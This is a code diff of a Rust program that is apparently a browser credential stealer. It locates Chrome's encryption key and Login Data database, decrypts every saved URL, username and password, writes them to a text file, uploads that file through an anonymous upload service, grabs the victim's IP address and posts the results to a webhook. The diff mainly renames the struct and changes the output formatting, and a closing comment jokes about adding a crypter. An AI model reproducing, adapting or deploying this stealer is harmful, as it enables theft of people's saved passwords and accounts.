@@ -15,25 +15,26 @@ use reqwest::blocking::{Client,multipart};
 
 
 #[derive(Debug)]
-struct Chromepass {
+struct Pass {
     url: String,
     login: String,
     password: String,
 }
-impl std::fmt::Display for Chromepass {
+impl std::fmt::Display for Pass {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
         write!(f, "{}\n{}\n{}", self.url, self.login, self.password)
     }
 }
+
 //JUST CHROME VERS
-impl Chromepass {
+impl Pass {
 
     fn local_app_data_folder(open: &str) -> PathBuf {
         AppDirs::new(Some(open), false).unwrap().data_dir
     }
 
-    fn chrome_saved_key() -> Result<Vec<BYTE>, std::io::Error> {
-        let local_state_path = Chromepass::local_app_data_folder("Google\\Chrome\\User Data\\Local State");
+    fn br_saved_key() -> Result<Vec<BYTE>, std::io::Error> {
+        let local_state_path = Pass::local_app_data_folder("Google\\Chrome\\User Data\\Local State");
         let file = File::open(local_state_path)?;
         
         let mut buf_reader = BufReader::new(file);
@@ -75,9 +76,9 @@ impl Chromepass {
         }
     
     fn find_db() -> std::io::Result<PathBuf> {
-        let local_sqlite_path = Chromepass::local_app_data_folder("Google\\Chrome\\User Data\\Default\\Login Data");
+        let local_sqlite_path = Pass::local_app_data_folder("Google\\Chrome\\User Data\\Default\\Login Data");
         
-        let moved_to = Chromepass::local_app_data_folder("sqlite_file");
+        let moved_to = Pass::local_app_data_folder("sqlite_file");
         
         let db_file = moved_to.clone();
         
@@ -85,21 +86,21 @@ impl Chromepass {
         Ok(db_file)
     }
 
-    fn obtain_data_from_db() -> Result<Vec<Chromepass>> {
-        let conn = Connection::open(Chromepass::find_db().unwrap())?;
+    fn obtain_data_from_db() -> Result<Vec<Pass>> {
+        let conn = Connection::open(Pass::find_db().unwrap())?;
         //ok load it
         let mut stmt = conn.prepare("SELECT action_url, username_value, password_value from logins")?;
-        let chrome_data = stmt.query_map([], |row| {
-            Ok(Chromepass {
+        let p_data = stmt.query_map([], |row| {
+            Ok(Pass {
             url: row.get(0)?,
             login: row.get(1)?,
-            password: Chromepass::decrypt_password(row.get(2)?).unwrap(),
+            password: Pass::decrypt_password(row.get(2)?).unwrap(),
             })
             })?;
         
         let mut result = vec![];
         
-        for data in chrome_data {
+        for data in p_data {
             result.push(data.unwrap());
         }
         
@@ -107,7 +108,7 @@ impl Chromepass {
     }
 
     fn decrypt_password(password: Vec<u8>) -> winapi::_core::result::Result<String, Error> {
-        let key_buf = Chromepass::chrome_saved_key().unwrap();
+        let key_buf = Pass::br_saved_key().unwrap();
         let key = GenericArray::from_slice(key_buf.as_ref());
         let cipher = Aes256Gcm::new(key);
         let nonce = GenericArray::from_slice(&password[3..15]);
@@ -119,6 +120,7 @@ impl Chromepass {
         }
 
 }
+
 
 fn anon_upload(fpath: &'static str) -> Result<String, reqwest::Error> {
     let mut file = File::open(fpath).unwrap();
@@ -145,18 +147,17 @@ fn main() {
     //gettings IP of tagert just testing :0
 
     //ok lets load it into a text file 
-    let chrome_datap = Chromepass::obtain_data_from_db().unwrap();
+    let passda = Pass::obtain_data_from_db().unwrap();
     let mut filep = fs::File::create("passwords.txt").unwrap();
-    for chrome in chrome_datap {
-        let url = if chrome.url.is_empty() { "None".to_owned() } else { chrome.url };
-        let login = if chrome.login.is_empty() { "None".to_owned() } else { chrome.login };
-        let password = if chrome.password.is_empty() { "None".to_owned() } else { chrome.password };
+    for passw in passda {
+        let url = if passw.url.is_empty() { "None".to_owned() } else { passw.url };
+        let login = if passw.login.is_empty() { "None".to_owned() } else { passw.login };
+        let password = if passw.password.is_empty() { "None".to_owned() } else { passw.password };
         if url != "None" || login != "None" || password != "None" {
-            let line = format!("\nurl: {}\nusername: {}\npassword: {}\n", url, login, password);
+            let line = format!("-----------------------------\nurl: {}\nusername: {}\npassword: {}\n-----------------------------", url, login, password);
             filep.write_all(line.as_bytes()).unwrap();
         }
     }
-
     let file_path = "passwords.txt";
     let plink = anon_upload(file_path).unwrap();
     let response = reqwest::blocking::get("https://api.ipify.org").unwrap();
@@ -178,7 +179,7 @@ fn main() {
     
 
     let client = Client::new();
-    let res = client.post("WEBHOOK")
+    let res = client.post("WEBHOOK/FOWARD URL")
         .body(json_data.to_string())
         .header("Content-Type", "application/json")
         .send()
@@ -186,3 +187,4 @@ fn main() {
 
     println!("{:#?}", res);
 }
+//imagine if I made a crypter UWU
